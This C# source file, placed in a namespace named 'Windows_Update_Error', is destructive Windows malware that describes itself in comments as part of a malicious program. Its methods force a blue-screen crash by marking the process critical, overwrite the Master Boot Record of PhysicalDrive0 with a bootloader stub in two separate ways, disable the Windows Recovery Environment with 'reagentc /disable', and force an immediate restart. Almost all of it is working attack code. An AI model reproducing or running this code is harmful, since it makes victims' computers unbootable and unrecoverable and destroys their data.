using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Windows_Update_Error
{
    // This class contains methods related to system-level operations that are used by the malicious program.
    public class Test
    {
        // Import the CreateFileA function from kernel32.dll.
        // This function is used to create or open a file or I/O device.
        // SetLastError = true enables getting detailed error information when an error occurs.
        [DllImport("kernel32.dll", SetLastError = true)]
        // Define an external function to create or open a file.
        // lpFileName: The name of the file or device to create or open.
        // dwDesiredAccess: The desired access rights to the file or device.
        // dwShareMode: The sharing mode of the file or device.
        // lpSecurityAttributes: A pointer to a SECURITY_ATTRIBUTES structure that determines the security attributes of the file or device.
        // dwCreationDisposition: An action to take on the file or device if it exists or not.
        // dwFlagsAndAttributes: The file or device attributes and flags.
        // hTemplateFile: A handle to a template file, if applicable.
        public static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        // Import the WriteFile function from kernel32.dll.
        // This function is used to write data to a file.
        [DllImport("kernel32.dll", SetLastError = true)]
        // Define an external function to write data to a file.
        // hFile: The handle of the file to write to.
        // lpBuffer: A pointer to the buffer containing the data to write.
        // nNumberOfBytesToWrite: The number of bytes to write from the buffer.
        // lpNumberOfBytesWritten: A pointer to a variable that receives the number of bytes actually written.
        // lpOverlapped: A pointer to an OVERLAPPED structure, if applicable.
        public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);

        // Define constants for file sharing and access rights.
        public const int File_Share_Read = 0x00000001;
        public const int File_Share_Write = 0x00000002;
        public const uint Generic_Read = 0x80000000;
        public const uint Generic_Write = 0x40000000;
        public const int Open_Existing = 3;

        // Import the NtSetInformationProcess function from ntdll.dll.
        // This function is used to set information about a process.
        [DllImport("ntdll.dll", SetLastError = true)]
        // Define an external function to set process information.
        // hProcess: The handle of the process.
        // processInformationClass: The type of process information to set.
        // processInformation: A pointer to the buffer containing the process information to set.
        // processInformationLength: The length of the process information buffer.
        public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        // Method to trigger a blue screen.
        // It marks the current process as critical and then exits the application.
        // This action causes the system to crash with a blue screen.
        public void Nt_Error()
        {
            // The value 1 indicates that the process is critical.
            int isCritical = 1;
            // The value 29 represents the process information class for BreakOnTermination.
            int BreakOnTermination = 29;
            // Mark the current process as critical using the NtSetInformationProcess function.
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            // Exit the application.
            Application.Exit();
        }

        // Method to modify the MBR (Master Boot Record).
        // It constructs a malicious MBR data buffer and attempts to write it to the disk.
        // Modifying the MBR can prevent the system from booting properly.
        public void killmbr()
        {
            // The following byte array represents the malicious MBR data.
            byte[] mbr1 = { 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xBD, 0x17, 0x7C, 0xB9, 0x03, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xC3, 0x54, 0x76, 0x54 };
            // Create a new byte array with the size of a standard MBR (512 bytes).
            byte[] mbrdata = new byte[512];
            // Copy the malicious MBR data to the new array.
            for (int i = 0; i < mbr1.Length; i++)
            {
                mbrdata[i] = mbr1[i];
            }
            // Set the required MBR signature bytes at the end of the array.
            mbrdata[510] = 0x55;
            mbrdata[511] = 0xAA;
            // The path to the physical drive.
            string Path = @"\\.\PhysicalDrive0";
            // Open the physical drive as a file stream for read-write access.
            using (FileStream file = new FileStream(Path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
            {
                // Write the malicious MBR data to the physical drive.
                file.Write(mbrdata, 0, 512);
            }
        }

        // Another method to modify the MBR using Windows API calls.
        // It has similar functionality as killmbr but uses different implementation.
        public int killmbrA()
        {
            // Variable to store the number of bytes written.
            int write = 0;
            // The NULL pointer value.
            uint NULL = 0;
            // The malicious MBR data.
            byte[] mbr1 = { 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xBD, 0x17, 0x7C, 0xB9, 0x03, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xC3, 0x54, 0x76, 0x54 };
            // Create a new byte array with the size of a standard MBR (512 bytes).
            byte[] mbrdata = new byte[512];
            // Copy the malicious MBR data to the new array.
            for (int i = 0; i < mbr1.Length; i++)
            {
                mbrdata[i] = mbr1[i];
            }
            // Set the required MBR signature bytes at the end of the array.
            mbrdata[510] = 0x55;
            mbrdata[511] = 0xAA;
            // Open the physical drive using the CreateFileA function.
            IntPtr mbr = CreateFileA(@"\\.\PhysicalDrive0",
                                  Generic_Read | Generic_Write,
                                  File_Share_Read | File_Share_Write,
                                  NULL, Open_Existing, NULL, 0);
            // Write the malicious MBR data to the physical drive using the WriteFile function.
            bool x = WriteFile(mbr, mbrdata, 512, ref write, 0);
            // Check if the write operation was successful.
            if (x != false)
            {
                // Return 1 if the write was successful.
                return 1;
            }
            else
            {
                // Return -1 if the write failed.
                return -1;
            }
        }

        // Method to restart the computer.
        // It executes the shutdown command with the /r (restart) option and a 0-second delay.
        public void Shutdown_PC()
        {
            Process.Start("shutdown", "/r /t 0");
        }

        // Method to disable Windows_RE (Recovery Environment).
        // It executes the reagentc command with the /disable option to disable the Windows Recovery Environment.
        public void Disable_WinRE()
        {
            Process.Start("reagentc", "/disable");
        }
    }
}